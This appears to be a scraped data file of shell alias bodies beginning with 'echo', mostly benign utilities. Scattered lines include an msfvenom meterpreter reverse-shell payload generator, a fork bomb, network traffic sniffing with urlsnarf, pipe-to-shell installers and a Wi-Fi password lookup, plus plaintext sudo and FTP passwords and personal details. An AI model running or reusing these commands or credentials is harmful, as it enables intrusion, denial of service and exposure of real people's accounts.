"echo 'lines, words, chars, in files:'; ls -S | xargs wc"
"echo 'brew update && brew upgrade && brew cask list | xargs brew cask upgrade && brew cleanup' \
"echo 'You may prefer du -csh | sort -rh, ncdu or pydf...' && df -Tha"
"echo 'Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.' | pbcopy"
"echo '3111 107th Pl SE, Bellevue, WA 98004' | pbcopy"
"echo && echo ""PATH:"" && echo $PATH | tr "":"" ""\n"" && echo"
"echo && echo ""CLASSPATH:"" && echo $CLASSPATH | tr "":"" ""\n"" && echo"
"echo ${PYTHONPATH} | tr "":"" ""\n"""
"echo ${PYTHONPATH_RSMAS} | tr "":"" ""\n"""
"echo ${PATH} | tr "":"" ""\n"""
"echo ${PATH} | sed ""s/:/\n/g"""
"echo ${LD_LIBRARY_PATH} | tr "":"" ""\n"""
"echo ${LD_LIBRARY_PATH} | sed ""s/:/\n/g"""
"echo $path | tr -s "":"" ""\n"""
"echo $path | tr "" "" ""\n"""
"echo $path | python2.7 -c ""for i in raw_input().split(): print i"""
"echo $path | python -c ""for i in raw_input().split(): print i"""
"echo $fpath | tr -s "" "" ""\n"""
"echo $fpath | tr "" "" ""
"echo $dataset_details_local_url | pbcopy && echo ""copied!"""
"echo $TMUX | cut -f1 -d','"
"echo $SSH_CONNECTION | cut -f3 -d "" """
"echo $SSH_CLIENT | cut -f1 -d "" """
"echo $SSH_CLIENT | cut -d"" "" -f1 >~/.tmux_last_ssh_client && tmux"
"echo $SSH_CLIENT | cut -d"" "" -f1 >~/.screen_last_ssh_client && screen"
"echo $PYTHONPATH|pyline ""\""\n\"".join(line.split(\"":\""))"""
"echo $PYTHONPATH | tr -s "":"" ""\n"""
"echo $PYTHONPATH | tr "":"" ""\n"""
"echo $PWD | pbcopy; echo -e ""${CYAN} $PWD ${NC}copied to the clipboard"""
"echo $PERL5LIB | sed ""s/:/\n/g"""
"echo $PATH|tr : ""\n"""
"echo $PATH|tr "":"" ""\n"""
"echo $PATH|sed ""s/\:/\\n/g"""
"echo $PATH|sed ""s/:/:\n/g"""
"echo $PATH|pyline ""\""\n\"".join(line.split(\"":\""))"""
"echo $PATH | tr : ""\n"""
"echo $PATH | tr -s "":"" ""\n\r"""
"echo $PATH | tr -s "":"" ""\n"""
"echo $PATH | tr "":"" ""\n"""
"echo $PATH | tr "":"" ""\012"""
"echo $PATH | tr "":"" ""\012"" "
"echo $PATH | sed -r ""s/:/\n/g"""
"echo $PATH | sed -e 's/:/\\
"echo $PATH | sed -e ""s/:/\n/g"""
"echo $PATH | sed -e ""s/:/\n/g"" "
"echo $PATH | sed ""y/:/\n/"""
"echo $PATH | sed ""s/:/\n/g"""
"echo $PATH | sed ""s)\:)\n)g"""
"echo $PATH | ruby -pe ""gsub(/:/, \""\n\"")"""
"echo $PATH | ruby -e ""puts \$stdin.read().split(\"":\"")"""
"echo $PATH | perl -pe ""s/:/\n/g"""
"echo $PATH | h -n olo olo olo olo olo olo "":"" ""usr"" ""sbin"" ""opt"" ""local"" ""games"" ""ack"""
"echo $PASSWORDENV | sshfs -o reconnect,password_stdin ptgdk@srv50161.global.leo-group.net:/ ~/binf -ovolname=binf"
"echo $MODULEPATH | sed ""s/:/\n/g"""
"echo $MANPATH | tr : ""\n"""
"echo $MANPATH | tr -s "":"" ""\n"""
"echo $MANPATH | sed ""s/:/\n/g"""
"echo $LD_LIBRARY_PATH | tr : ""\n"""
"echo $LD_LIBRARY_PATH | tr "":"" ""\n"""
"echo $LD_LIBRARY_PATH | sed ""y/:/\n/"""
"echo $LD_LIBRARY_PATH | sed ""s/:/\n/g"""
"echo $IDL_PATH|pyline ""\""\n\"".join(line.split(\"":\""))"""
"echo $FPATH | tr -s "":"" ""\n"""
"echo $FPATH | tr "":"" ""\n"""
"echo $DYLD_LIBRARY_PATH | tr "":"" ""\n"""
"echo $CLASSPATH | tr "":"" ""\n"""
"echo $CLASSPATH | sed -e ""s/[:;]/\n/g"""
"echo $CDPATH | tr : ""\n"""
"echo $(wget http://ipinfo.io/ip -qO - | tr -d ""\n\r"")"
"echo $(sudo hddtemp /dev/sda | awk ""{ print \$4 }"")"
"echo $(randpass) $(randpass) | tr -d ""+/ """
"echo $(pwd) | xclip && pwd && echo ""path copied"""
"echo $(node -p -e ""JSON.stringify(require(process.cwd()+\""/package.json\"").scripts)"") | jq "
"echo $(grep -v -E ""^[A-Z]|"
"echo $(grep -c ""full system upgrade"" /var/log/pacman.log) upgrades since $(head -n1 /var/log/pacman.log | cut -d "" "" -f 1,2)"
"echo $(echo $PWD | sed -e ""s@/mnt/c@c:@g"" -e ""s@/mnt/d@d:@g"" -e ""s@/mnt/e@e:@g"" -e ""s@/@\\\@g"" )"
"echo $(echo $(pwd) | sed ""s:^$HOME:~:"") > $FDPATH"
"echo $(curl -s http://ip-api.com/json | jq -r "".country,.city"")"
"echo $(command ls --file-type | grep ""/"")"
"echo $(basename $PWD | tr ""[:upper:]"" ""[:lower:]"")"
"echo $(basename ""$PWD"" | tr -d ""\n\r"")"
"echo $(/bin/date ""+%Y-%m-%dT%T"") $(/usr/local/bin/fast) | tee -a ~/.fast.log"
"echo $( < /dev/urandom tr -d -C ""[:graph:]"" | dd bs=1 count=30 2> /dev/null )"
"echo ""（╯°□°）╯︵ ┻━┻"" | pbcopy"
"echo ""从"" $(head /var/log/pacman.log -n1 | cut -c1-18) ""起，滚了"" $(rg -c ""full system upgrade"" /var/log/pacman.log) ""次"""
"echo ""¯\_(ツ)_/¯"" | xclip"
"echo ""¯\_(ツ)_/¯"" | xclip -selection clipboard"
"echo ""¯\_(ツ)_/¯"" | xclip -selection clipboard && echo ""¯\_(ツ)_/¯"""
"echo ""¯\_(シ)_/¯"" | xclip -selection c && echo ""¯\_(シ)_/¯ copied"""
"echo ""¯\_(ツ)_/¯"" | xclip -in -selection clipboard"
"echo ""¯\_(ツ)_/¯"" | pbcopy"
"echo ""¯\_(シ)_/¯"" | pbcopy && echo ""¯\_(シ)_/¯ copied"""
"echo ""¯\_(ツ)_/¯"" | pbcopy && echo ""¯\_(ツ)_/¯ copied to clipboard."""
"echo ""¯\_(ツ)_/¯"" | co"
"echo ""¯\\\\\_(ツ)_/¯"" | pbcopy"
"echo ""y2ebhv3r"" | pbcopy; echo ""alt-v to paste""; ftp xsvx1018212@xsvx1018212.xsrv.jp"
"echo ""y""| gcloud components update"
"echo ""y"" | yup"
"echo ""y"" | rake install && rake generate"
"echo ""y"" | pacman -Syu > stuff2do4pacman.txt"
"echo ""x = (`date +%s` + 3600) % 86400; scale=3; x / 86.4"" | bc"
"echo ""wget http://ipinfo.io/ip -qO -"" | cb"
"echo ""use pathrm <string>|<indexes> to remove matching item from \$PATH -- (for indexes use :<n>[,<n>...] where <n> is per pathsi output)"""
"echo ""url:http://tool.chinaz.com/tools/urlencode.aspx \necho -n \""openid_openkey_offerid_pf_KEY\” | md5 -r"""
"echo ""update.packages (ask = FALSE)"" | R --no-save -q"
"echo ""u9btYvV8G6L7otRe9nLjOZihAExO4dXKKz9TdQhoe7SFrBk8gBk8Qtwr+CX9mxnb"" | openssl enc -base64 -d -aes-256-cbc -nosalt"
"echo ""u38678890-term"" | pbcopy"
"echo ""total objets"" && ls -A |wc -l"
"echo ""total num: "" && ls | wc -l && du -sh"
"echo ""toot @megurubot update"" | tootstream"
"echo ""title: "" && read -r input && echo ""when: "" && read -r inputt && gcalcli add --duration 60 --title ""$(echo $input | sed -r "
"echo ""test"" | gpg --clearsign"
"echo ""test from postfix"" | mail -s ""Test: Server $SERVER_ID -- Postfix"" seth.t.chase@gmail.com"
"echo ""tell app \""Terminal\"" to set current settings of first window to settings set \""rplinux\""""|osascript"
"echo ""tell app \""Terminal\"" to set current settings of first window to settings set \""Basic\""""|osascript"
"echo ""tail -f /usr/applications/ag-commerce-scc-uat/log/tomcat/console-`/bin/date +\%Y\%m\%d`.log"" | ssh asolberg@uatapp"
"echo ""tail -f /usr/applications/ag-commerce-scc-uat/log/tomcat/console-`/bin/date +\%Y\%m\%d`.log"" | ssh asolberg@keyapp"
"echo ""tail -f /usr/applications/ag-commerce-scc-uat-2/log/tomcat/console-`/bin/date +\%Y\%m\%d`.log"" | ssh asolberg@uatapp"
"echo ""tail -f /usr/applications/ag-commerce-scc-rsdev/log/tomcat/console-`/bin/date +\%Y\%m\%d`.log"" | ssh asolberg@devapp"
"echo ""tail -f /usr/applications/ag-commerce-scc-prod/log/tomcat/console-`/bin/date +\%Y\%m\%d`.log"" | ssh asolberg@prodapp5"
"echo ""tail -f /usr/applications/ag-commerce-scc-prod/log/tomcat/console-`/bin/date +\%Y\%m\%d`.log"" | ssh asolberg@prodapp4"
"echo ""tail -f /usr/applications/ag-commerce-scc-prod/log/tomcat/console-`/bin/date +\%Y\%m\%d`.log"" | ssh asolberg@prodapp3"
"echo ""tail -f /usr/applications/ag-commerce-scc-prod/log/tomcat/console-`/bin/date +\%Y\%m\%d`.log"" | ssh asolberg@prodapp2"
"echo ""tail -f /usr/applications/ag-commerce-scc-prod/log/tomcat/console-`/bin/date +\%Y\%m\%d`.log"" | ssh asolberg@prodapp1"
"echo ""sucg"" | sudo -S purge"
"echo ""stats"" | nc localhost 11211"
"echo ""stats slabs"" | nc localhost 11211"
"echo ""stats sizes"" | nc localhost 11211"
"echo ""stats settings"" | nc localhost 11211"
"echo ""stats items"" | nc localhost 11211"
"echo ""stats gets"" | nc localhost 11211"
"echo ""stats get"" | nc localhost 11211"
"echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApiTmz7vDqoAYU2XwtedoVWOwEIZ9uoiMBoIBYi+ukzmw2Z4t+fKGVuSyAp++LscWppXwoRnHs1tdOPOhX0LcPtOXM1QXlRGen/mfLUDptTXMI/1nkcWTPvF+0rKZd/uBPW4ud+0a47KhnfPh+ShLc1ZVK/iib8GHd1qctKEdrVFgCoEDpAEFxFeM4J3vbBOOVeSODD9jWi0aELPPgHotnoyUElaSP6H9lZmZSw8XHiezPLgxgUBsA1tfWLM5f36+sjWQOtKBRreQ1d6Y5lUMHckwBpQINbsjn6r9ZQuenhVxbCjxpHk+wYwu1yDt0dBcCMV2DCkyjtXzQ74MHzDZoQ== dan@Daniel-Jaouens-iMac.local"" | pbcopy"
"echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA47M4qmsZT2Ztju1/l/NLVOYKwYSnhTFHG4WuFIc2RfhfQ7Zj1D8Y3renX/uVYtERk6A6axRjAbfqS7Cl73u/UapMnap0a5ysP3AP31+jmEAEfyz3DhellcN08sgIxV5YTC8kpfBi752XhdK9gfVzzxlzQHiGbFMQkMXUnxPsqObdRsAafMFxy7QcZU9s4mL+w2dSWdN24Dg84REAuDP3Rt1P3ORTHbzxLsRAUPG5OTChfjG/ITZYDdmv/g2R0vEcdoSGxGVsja3DTfaUz1kgWtbDA+w0w7VJT6THkz2tkMqwqcRh1w3uG4qvtw2TE84Vj5b73w29kbpcNEcQwtlTtQ== dumbwaiterdesign@Dumbwaiter-Designs-MacBook-Pro.local"" | pbcopy"
"echo ""sqlite3 VACUUM and REINDEX on firefox"";for x in `find ~ -type f -name *.sqlite* | grep firefox`;do echo ""$x"";sqlite3 $x VACUUM;sqlite3 $x REINDEX;done"
"echo ""skipping venv"" && tree -a -I "".git|venv"""
"echo ""skipping vender"" && tree -a -I "".git|vender"""
"echo ""skipping node_moudles"" && tree -a -I "".git|node_modules"""
"echo ""shutdown /h"" | cmd"
"echo ""show slave status\G"" | mysql"
"echo ""show errors"" | nc -U /var/lib/haproxy/stats"
"echo ""see which websites others on network are visiting"" && sudo urlsnarf -i wlp6s0 |cut -d\"" -f4"
"echo ""see which websites others on network are visiting"" && sudo urlsnarf -i wlp3s0 |cut -d\"" -f4"
"echo ""see which websites others on network are visiting"" && sudo urlsnarf -i eno1|cut -d\"" -f4"
"echo ""see which websites others on network are visiting"" && sudo snarf -i wlp6s0|cut -d\"" -f4"
"echo ""scale=39;4*a(1)"" | bc -l"
"echo ""scale=1; $(cat /sys/class/power_supply/BAT0/charge_now) / $(cat /sys/class/power_supply/BAT0/charge_full) err.txt generated.file succ.txt 100 ""| bc"
"echo ""scale=10; 4*a(1)"" | bc -l"
"echo ""s\n"" | pdflatex -shell-escape book.tex > /dev/null"
"echo ""s/keyword/^M/g | ^M -> ctrl+v ctrl+m"""
"echo ""reloading bashrc..."" | lolcat-q; source $BASH_CONF"
"echo ""reg|bold"" ; for i in {30..36} ; do echo -e ""\033[0;${i}m ${i} \033[1;${i}m ${i} \033[0m"" ; done"
"echo ""redir add tcp:7000:7000"" | nc 127.0.0.1 5554 & PID=$!; sleep 1; kill $PID"
"echo ""ps aux | grep ruby kill -9 xxxxx"""
"echo ""proxy settings for ${HOSTNAME}:""; echo """"; env | grep -i proxy"
"echo ""powersave"" | sudo tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor"
"echo ""power on\nconnect $headset_mac"" | bluetoothctl"
"echo ""power on\n agent on\n default-agent\n connect 2C:41:A1:01:87:F8"" | bluetoothctl"
"echo ""power on\n agent on\n default-agent\n connect 00:22:37:36:78:49"" | bluetoothctl"
"echo ""power on"" | bluetoothctl"
"echo ""please kill me"" | espeak -s 80 -p 2 > /dev/null 2>&1"
"echo ""please kill me"" | espeak -s 80 -p 2 -v +whisper > /dev/null 2>&1"
"echo ""please kill me"" | espeak -s 80 -p 2 -v +f1 > /dev/null 2>&1"
"echo ""performance"" | sudo tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor"
"echo ""pbs: qstat""; qstat |cut -c1-100"
"echo ""pager less -SFX -# 10"" | cpy"
"echo ""pacman -Sc && pacman-optimize && echo -e \""ORPHANS\n-------\"" && pacman -Qtdq"" | sudo /bin/bash"
"echo ""packages reload ""| ncs_cli -C"
"echo ""options rtl8723be fwlps=0"" | sudo tee /etc/modprobe.d/rtl8723be.conf"
"echo ""opkg update && opkg upgrade"" | sudo bash"
"echo ""openstack server suspend | openstack server resume"""
"echo ""notify-send -i dialog-information -t 0 \""Tea!\"" \""Your tea is nicely brewed\"""" | at now +4 minutes"
"echo ""nameserver 8.8.8.8"" | sudo tee /etc/resolv.conf > /dev/null"
"echo ""nameserver 8.8.4.4\nnameserver 8.8.8.8"" | sudo tee /etc/resolv.conf"
"echo ""nameserver 165.21.100.88"" | sudo tee /etc/resolv.conf"
"echo ""msfvenom -p windows/meterpreter/reverse_tcp LHOST=__IP__ LPORT=__LPORT__ -f psh --smallest | msfvenom -p - --platform win --arch x32 --encoder powershell/base64 NOEXIT SYSWOW64 -o payload.ps1"""
"echo ""money"" | sudo emacs /opt/local/etc/mysql55/my.cnf"
"echo ""money"" | sudo emacs /opt/local/etc/mysql55/macports-default.cnf"
"echo ""mocp -p"" |"
"echo ""mem"" | sudo tee /sys/power/state"
"echo ""main(){}"" | gcc -E -x c -dM - "
"echo ""main(){}"" | g++ -std=c++0x -E -x c++ -dM - "
"echo ""main(){}"" | g++ -E -x c++ -dM - "
"echo ""ls ./*.go | xargs sed -i.bak -e \""s/\.\.\/testdata/testdata/g\"""""
"echo ""ls -la - done"" | ls -la"
"echo ""listing of disk usage for $(pwd)""; du -csh err.txt generated.file succ.txt | sort -n"
"echo ""lOv13!"" | sudo -S shutdown -r now"
"echo ""kldhs"" | sudo -S pm-suspend-hybrid"
"echo ""kldhs"" | sudo -S init 0"
"echo ""jon.surrell+$( openssl rand -hex 10 )@gmail.com"" | pbcopy"
"echo ""job finished"" | mail -s ""WAKE UP"" nvincent@sequans.com"
"echo ""import numpy as np\nimport matplotlib.pyplot as plt"" | pbcopy"
"echo ""https://raw.githubusercontent.com"" | xsel -ib && xsel -ob"
"echo ""http://uj3wazyk5u4hnvtk.onion/"" | xsel --clipboard && $HOME/tor-browser/Browser/start-tor-browser --detach"
"echo ""http://thomas.zendesk.com"" | zat"
"echo ""http://imgur.com/a/T81t9copy"" | copy"
"echo ""http://bit.do/lgtm"" | pbcopy"
"echo ""http://`ipconfig getifaddr en0`:13377"" | pbcopy"
"echo ""http://7ximmr.com1.z0.glb.clouddn.com/""|pbcopy"
"echo ""highlight --style=github -k \""Fira Code\"" -K 18 -u \""utf-8\"" -t 4 -O rtf filename | pbcopy"""
"echo ""high"" | sudo tee /sys/class/drm/card1/device/power_dpm_force_performance_level"
"echo ""google"" | sudo -S"
"echo ""google"" | sudo -S systemctl daemon-reload && sudo systemctl restart docker"
"echo ""google"" | sudo -S su -c ""aptitude upgrade -y"""
"echo ""google"" | sudo -S su -c ""aptitude update"""
"echo ""google"" | sudo -S su -c ""aptitude dist-upgrade -y"""
"echo ""google"" | sudo -S su -c ""aptitude autoclean"" && sudo su -c ""aptitude clean"""
"echo ""google"" | sudo -S su -c ""aptitude autoclean"" && sudo su -c ""aptitude clean"" && sudo su -c ""apt-get autoremove"" && sudo su -c ""apt-get autoclean"" && sudo su -c ""apt-get clean"""
"echo ""google"" | sudo -S su -c ""apt-get autoremove -y"""
"echo ""git log old_commit_hash..new_commit_hash | grep -E \""Merged\"""""
"echo ""git fetch..."" && git fetch && echo ""git fetch --prune..."" && echo ""Branches deleted on remote:"" && git fetch --prune 2>&1 | awk "
"echo ""foo"" | gpg -o /dev/null --local-user 9F53F154 -as -"
"echo ""flushall"" | nc -U /var/tmp/redis-multi_$1.$2_cache.sock"
"echo ""flush_all"" | nc localhost 11211; sudo service php5-fpm restart; sudo service nginx restart"
"echo ""flush_all"" | nc localhost 11211"
"echo ""flush_all"" | nc 172.20.8.24 11211"
"echo ""flush_all"" | nc 127.0.0.1 11211"
"echo ""flush_all"" | nc 10.10.27.11 11211"
"echo ""flush_all"" | nc -U /var/tmp/memcached.$1.$2_sessions.sock"
"echo ""find file to restore : "" && read MSG && duply den list | grep ""$MSG"""
"echo ""find ./err.txt ./generated.file ./succ.txt -type f -print | xargs grep \""hoge\"" /dev/null"""
"echo ""find . -type f | perl -ne "
"echo ""find . -name \""*XXX*\"" | xargs vim -p"""
"echo ""find . -name \""*XXX*\"" | xargs rm -v"""
"echo ""echo 3 > /proc/sys/vm/drop_caches"" | sudo -s"
"echo ""echo 1 > /proc/sys/vm/drop_caches"" | sudo sh;"
"echo ""echo 1 > /proc/sys/vm/drop_caches"" | sudo sh"
"echo ""eFN6NpPx6NVWucXU6Q3yZhsu58QqVm6M7H5JodN849ubr/pLz2EdgZejzpy/cLtw"" | openssl enc -base64 -d -aes-256-cbc -nosalt -pbkdf2 -iter 1000"
"echo ""e scp://u38678890-term@tedoliver.net/"" | pbcopy && mvim"
"echo ""e scp://pi@192.168.1.71/"" | pbcopy && mvim"
"echo ""dstat\\nuptime\\ndmesg | tail\\nvmstat 1\\nmpstat -P ALL 1\\npidstat 1\\niostat -xz 1nfree -m\\nsar -n DEV 1\\nsar -n TCP,ETCP 1\\ntop\\niotop\\ndocker stats"""
"echo ""drop database muscovado_test; create database muscovado_test;"" | db && paster setup-app test.ini"
"echo ""document.getElementsByTagName(\""video\"")[0].playbackRate = 3"" | pbcopy"
"echo ""display notification with title \""done\"" sound name \""Frog\"""" | /usr/bin/osascript"
"echo ""disable"" | $FRESHBINS/deploy.par --alsologtostderr --verbosity=0 -disable"
"echo ""deploy"" | $FRESHBINS/deploy.par --alsologtostderr --verbosity=0"
"echo ""deb https://download.sublimetext.com/ apt/dev/"" | sudo tee /etc/apt/sources.list.d/sublime-text.list && sudo apt-get update && sudo apt-get install sublime-text"
"echo ""deb http://linux-packages.resilio.com/resilio-sync/deb resilio-sync non-free"" | sudo tee /etc/apt/sources.list.d/resilio-sync.list && curl -LO http://linux-packages.resilio.com/resilio-sync/key.asc && sudo apt-key add ./key.asc && sudo apt-get update && sudo apt-get install -y resilio-sync"
"echo ""db.system.profile.find({millis:{$gt:500}})"" |mongo $SI_DC_DBURL"
"echo ""db.serverStatus().connections"" | mongo $SI_DC_DBURL"
"echo ""db.esf.remove({}); db.hrhis.remove({});"" | mongo $SI_DC_DBURL"
"echo ""curl --silent --show-error --retry 5 https://bootstrap.pypa.io/get-pip.py | sudo python2.7"""
"echo ""connect 70:88:6B:90:09:05"" | bluetoothctl"
"echo ""comando | convert label:@- file_immagine.png"""
"echo ""clear\nadd tunein:station:s222437\nplay 0\nclose"" | nc localhost 6600"
"echo ""cd ~/datmo_ws && catkin_make""|car"
"echo ""cd `pwd`"" | xsel --clipboard"
"echo ""cd /Users/carlambroselli/Development/Java/Mastermind/extra/business/plan/; pdflatex main.tex && pdflatex main.tex /dev/null && open main.pdf;"" | /bin/sh"
"echo ""cd $(pwd)"" | pbcopy"
"echo ""cat //title/text()"" | xmllint --shell http://www.exploit-db.com/rss.xml"
"echo ""blacklist pcspkr""|sudo tee -a /etc/modprobe.d/blacklist.conf"
"echo ""bin\nget /TWEC_Dev/Docker/last.log /tmp/last.log"" | ftp i5dev.twec.com > /dev/null && cat /tmp/last.log && rm /tmp/last.log"
"echo ""battery"" | sudo tee /sys/class/drm/card1/device/power_dpm_state > /dev/null"
"echo ""awful.tag.viewprev()"" | awesome-client"
"echo ""awful.tag.viewnext()"" | awesome-client"
"echo ""awesome.restart()""|awesome-client"
"echo ""awesome.restart()"" | awesome-client"
"echo ""awesome.restart()"" | awesome-client > /dev/null 2>&1"
"echo ""awesome.restart() | awesome-client"""
"echo ""admin"" | sudo git clone https://github.com/sethc23/aporo.git -b sencha $HOME_ENV/django/Dropbox/aporo/static/sencha"
"echo ""admin"" | sudo defaults write /Library/Preferences/com.apple.Bluetooth.plist ControllerPowerState 1"
"echo ""admin"" | sudo defaults write /Library/Preferences/com.apple.Bluetooth.plist ControllerPowerState 0"
"echo ""add State:/Network/Interface/en0/RefreshConfiguration temporary"" | sudo scutil"
"echo ""`shopt -s dotglob; \rm -fv *~`"" |\egrep ""\\S""; :"
"echo ""`pwd` : `ls| wc -l`""; a="
"echo ""`date +%y%m%d_%H%M%S`: \!*"" | tee -a ~/.didlist"
"echo ""`date +%s -d 10/13/2016` `date +%s`"" | awk "
"echo ""`date +%s -d $day` `date +%s`"" | awk "
"echo ""`cat /sys/class/power_supply/BAT0/capacity`% (`cat /sys/class/power_supply/BAT0/status | tr ""[A-Z]"" ""[a-z]""`)"""
"echo ""\n"" | sudo pacman -Sc"
"echo ""\`""| xclip -sel clipboard"
"echo ""\""$(pwd)\"""" | pbcopy"
"echo ""Your file is attached"" | mailimp -s ""See Attached File"" -F"
"echo ""YOUR_PASSWORD"" | sudo openconnect --user=YOUR_USERNAME --passwd-on-stdin vpnaccess.nd.edu/mfa"
"echo ""X[mX(BX)0OX[?5lX7X[rX8"" | tr ""XO"" ""\033\017"""
"echo ""X(0X)B"" | tr ""X"" ""\033"""
"echo ""Welcome to mutt""|cowsay;sleep 1;mutt"
"echo ""USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND""; ps aux|grep -i"
"echo ""USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND"" && ps aux | grep -i"
"echo ""USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND"" && ps aux | grep --color=auto"
"echo ""USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND"" && ps aux | grep --color=auto -i"
"echo ""USB__IN"" | tee /home/kistler/como/install/ApplicationFiles/usbEvents"
"echo ""USB_OUT"" | tee /home/kistler/como/install/ApplicationFiles/usbEvents"
"echo ""UID PID PPID C STIME TTY TIME CMD"";ps -ef|grep"
"echo ""This is a Test email from $HOSTNAME."" | mail -s ""Test email"" ""test@mozzler.com.au"""
"echo ""The current process count is: "" `ps ax|wc -l`"
"echo ""Subject: test"" | sendmail -v "
"echo ""Strike me down and I shall become stronger than you can possibly imagine."" | lolcat"
"echo ""StandbyMode:"";cat /opt/vsd/install/myenv.sh | grep ""ENV_VSD_STANDBY"""
"echo ""Sending private key to $1""; cat ~/.ssh/id_rsa.pub | ssh $1 ""cat - >> ~/.ssh/authorized_keys2"""
"echo ""Saving current path."" && echo $PWD >| ~/.saved_pwd"
"echo ""SYSTEM_PASSWORD"" | sudo -S /opt/lampp/manager-linux-x64.run"
"echo ""SSID:"" && read a && security find-generic-password -ga $a | grep ""password:"""
"echo ""SELECT array_to_json(array_agg(row_to_json(fooo))) FROM (`cat modules/sql/audit/retrieval.sql | sed "
"echo ""SELECT COUNT(*) FROM SCC_PROD_HYBRIS.PRD_PRODUCTS;"" | $ORACLE_HOME/bin/sqlplus system/oracle@//localhost:1521/xe.oracle.docker"
"echo ""Removing all mails with no sender set""; exiqgrep -f ""^<>$"" -i | xargs exim -Mrm"
"echo ""Removing .orig files...""; find . -name *.orig | while read -d $"
"echo ""Removing .orig files...""; find . -name ""*.orig"" | while read -d $"
"echo ""Removing .REMOTE files...""; find . -name ""*.REMOTE.*"" | while read -d $"
"echo ""Removing .LOCAL files...""; find . -name ""*.LOCAL.*"" | while read -d $"
"echo ""Removing .BASE files...""; find . -name ""*.BASE.*"" | while read -d $"
"echo ""Removing .BACKUP files...""; find . -name ""*.BACKUP.*"" | while read -d $"
"echo ""Proto Recv-Q Send-Q Local Address Foreign Address (state)"" && netstat -atp tcp | grep -i ""listen"""
"echo ""Private IP"" && ifconfig | sed -En ""s/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p"" && echo ""Public IP"" && dig +short myip.opendns.com @resolver1.opendns.com"
"echo ""PATH=:$PATH"" | tr : ""\n"""
"echo ""Not bim but vim."" | cowsay -f milk"
"echo ""Nicolas Braud-Santoni\n<nicolas@braud-santoni>\n\n772B 11B4 F2DC 80E1 212B\n3F41 B073 9AAD 91B7 CDC0\n\n5494 011A F573 2B89 AEA4\n5E54 3D03 120B C39B 56AB"" | sm -"
"echo ""Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren, no sea takimata sanctus est Lorem ipsum dolor sit amet. Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren, no sea takimata sanctus est Lorem ipsum dolor sit amet."" | pbcopy"
"echo ""Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."" | pbcopy"
"echo ""Logging in to Docker ECR - 278521702583"" && $(aws ecr get-login --registry-id=278521702583 --region us-west-2 | sed ""s/-e none//g"")"
"echo ""Listing your github repositories"";curl https://api.github.com/users/palpen/repos | grep -o ""git@[^\""]*"""
"echo ""List GitHub clone url"";curl https://api.github.com/users/palpen/repos?per_page=100 | grep -o ""https://github.com/[^\""]*\.git"""
"echo ""KEYS *"" | redis-cli"
"echo ""Install latest Pharo""; wget -O- get.pharo.org | bash -"
"echo ""INITIATING HACKING SEQUENCE"" && sleep .5 && for i in {1..100}; do sleep .1 | echo ""$i%""; done && echo ""MAINFRAME BREACHED"" && sleep 1.5 && echo ""EXTRACTING FILES..."" && sleep 3 && echo ""EXTRACTION COMPLETE."" && echo ""CYBERNUKING THE FIREWALL"" && say boom && echo ""CYBERWALL DESTROYED"" && sleep .5 && echo ""INSERTING PAYLOAD"" && sleep 2 && echo ""PAYLOAD INSERTED"" && echo ""CREATING BACKDOOR"" && sleep 6 && echo ""BACKDOOR CREATED"" && echo ""PROCESS COMPLETED"""
"echo ""I want to run migrations on env: DEV env_id:ADAM__AT__ANTHIA"" | devops/migrations/do-db-migrate -H localhost -p 5432 -d genie_dev"
"echo ""I am here."" | festival --tts"
"echo ""Hi! I would like to get in touch more. Can you send me a good phone number to reach you at? I would like to connect. Best regards!"" | pbcopy"
"echo ""Herby"" | sudo shutdown -h now"
"echo ""Hello there $USER""| lolcat"
"echo ""Generic form #>/dev/null (# is 1 by default)""; echo "" 2>&- ----> #>&- (close fd)""; echo "" |& ----> 2>&1""; echo "" &>/dev/null ----> 1>/dev/null 2>&1"""
"echo ""Files and Directories sorted in reversed order by size.""; echo ""Unit: 1-kB""; echo ""*******************************************************""; du -ksc err.txt generated.file succ.txt | sort -nr"
"echo ""FLUSHALL"" | redis-cli"
"echo ""Enter gap number""; read $x | xargs -I {} bspc config window_gap ""{}"""
"echo ""Displaying in less pager..."" && lein do kibit, cloverage, bikeshed, eastwood | less"
"echo ""Did you know that:""; whatis $(ls /bin | shuf -n 1)"
"echo ""Commit Message:"" && read COMMIT_MESSAGE && svn cp ^/trunk ^/tags/""$(svn_lasttag | awk -F. "
"echo ""Anakin does not like sand"" | cowsay -f dragon && npm run sandbox"
"echo ""Adding docker to ENV..."" && eval ""$(docker-machine env default)"" && env | grep DOCK"
"echo ""APTITUDE INSTALL LOG:"" && cat /var/log/aptitude | grep -i ""\[INSTALL\]"""
"echo ""APT INSTALL LOG:"" && cat /var/log/apt/history.log | grep -i "" install """
"echo ""ACCOUNT : $(aws iam list-account-aliases | jq -r "
"echo "":t main"" | ghci ~/.xmonad/xmonad.hs"
"echo "":(){:|:&};:"""
"echo "":%s/\s\+$//"" | pbcopy"
